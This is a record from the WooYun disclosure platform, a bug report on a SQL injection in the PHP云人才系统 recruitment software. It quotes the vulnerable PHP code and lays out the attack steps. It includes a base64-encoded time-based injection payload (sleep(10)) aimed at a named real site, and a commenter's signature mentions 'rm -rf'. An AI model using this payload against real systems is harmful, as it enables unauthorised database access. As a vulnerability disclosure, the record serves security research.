{"id": 6019, "wybug_id": "wooyun-2013-043618", "wybug_title": "php云人才系统sql注入漏洞", "wybug_corp": "php云人才系统", "wybug_author": "Matt", "wybug_date": "2013-11-21 17:15", "wybug_open_date": "2014-02-16 17:16", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-21：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-01-15：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-01-25：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-02-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-02-16：\t细节向公众公开  简要描述：  详细说明：  index.php?M=qqconnect&C=mcert&id=MScgYW5kIHNsZWVwKDEwKSBhbmQgJzEnPScxfDE0OTA4MTQyfA==测试model/qqconnect.class.phpfunction mcert_action(){    \t$id=$_GET['id'];\t\t$arr=@explode(\"|\",base64_decode($id));//解码\t\tif($id && is_array($arr) && $arr[0] && $arr[2]==$this->config['coding']){//主要看coding 是配置文件里面的 默认是空 如果修改\t\t#echo \"`email_status`='1'\",\"`uid`='\".$arr[0].\"'\";\t\t\t$nid=$this->obj->DB_update_all(\"member\",\"`email_status`='1'\",\"`uid`='\".$arr[0].\"'\");//带入查询 \t\t\t$nid?$this->obj->ACT_msg($this->config['sy_weburl'].\"/index.php?M=login&usertype=1\",\"激活成功\"):$this->obj->ACT_msg($this->config['sy_weburl'],\"激活失败，联系管理员认证\");\t\t}else{\t\t\t$this->obj->ACT_msg($this->config['sy_weburl'],\"非法操作！\",\"2\");\t\t}    }如果网站修改了coding的情况下model/sendcert.class.phpfunction sendcert_action()\t{\t\textract($_POST);\t\tif(md5($_POST[\"authcode\"])!=$_SESSION[authcode]){\t\t\t$this->obj->ACT_msg(\"index.php?M=forgetpw\",\"验证码错误\",\"2\");\t\t}\t\t$info = $this->obj->DB_select_once(\"member\",\"`username`='$username'\",\"`uid`,`email_status`,`email`\");\t\tif(is_array($info))\t\t{\t\t\tif($info[email_status]==\"1\")\t\t\t{\t\t\t\t$this->obj->ACT_msg(\"index.php?M=login&usertype=1\", $msg = \"您的账户已经激活，请直接登录！\", $st = 2, $tm = 3);\t\t\t}\t\t\t$randstr=rand(10000000,99999999);\t\t\t$base=base64_encode($info[uid].\"|\".$randstr.\"|\".$this->config[coding]);//这里加入了coding发送给了用户\t\t\t//echo $base;\t\t\t$data[\"type\"]=\"cert\";\t\t\t$data[\"email\"]=$info[email];\t\t\techo $this->config[sy_weburl].\"/index.php?M=qqconnect&C=mcert&id=\".$base;\t\t\t$data[\"url\"]=\"<a href='\".$this->config[sy_weburl].\"/index.php?M=qqconnect&C=mcert&id=\".$base.\"'>点击激活</a>\";\t\t\t$data[\"date\"]=date(\"Y-m-d\");\t\t\t$this->send_msg_email($data);\t\t\t$this->obj->ACT_msg(\"index.php?M=sendcert\", $msg = \"激活邮件已经发送到您的邮箱！\", $st = 2, $tm = 3);\t\t}else{\t\t\t$this->obj->ACT_msg(\"index.php?M=login\", $msg = \"对不起！没有该用户！\", $st = 2, $tm = 3);\t\t}\t}   漏洞证明：  这样我们构造攻击流程1 注册用户2 找回密码 打开找回密码页面获取一个验证码 然后 打开xx.com/index.php?M=sendcert&C=sendcert  POST提交 authcode=验证码&username=注册用户名3 查看邮箱 解密base内容 获取coding4 构造exp进行注入http://test.khjyw.net/index.php?M=qqconnect&C=mcert&id=MScgYW5kIHNsZWVwKDEwKSBhbmQgJzEnPScxfDE0OTA4MTQyfA==其中base部分解码为 1' and sleep(10) and '1'='1|14908142|进行延时注入   修复方案：  过滤   版权声明：转载请注明来源 Matt@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-02-16 17:16 厂商回复： 我们已于本月18号发布了修复补丁，感谢您的提供！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-21 18:59 |    \t\tmomo \t\t\t( 实习白帽子  |\t\t\t        Rank:91 漏洞数:24        | ★精华漏洞数:24 | WooYun认证√)\t\t \n  为何你忽略了不让看，为何这么吊    \n     2013-11-22 11:02 |    \t\t猪头子 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:35        | 自信的看着队友rm -rf/tar挂服务器)\t\t \n  重复了。。。    \n     2013-11-23 10:54 |    \t\t残废 \t\t\t( 普通白帽子  |\t\t\t        Rank:179 漏洞数:40        | 我是残废，啦啦啦啦)\t\t \n  你为何如此屌？    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}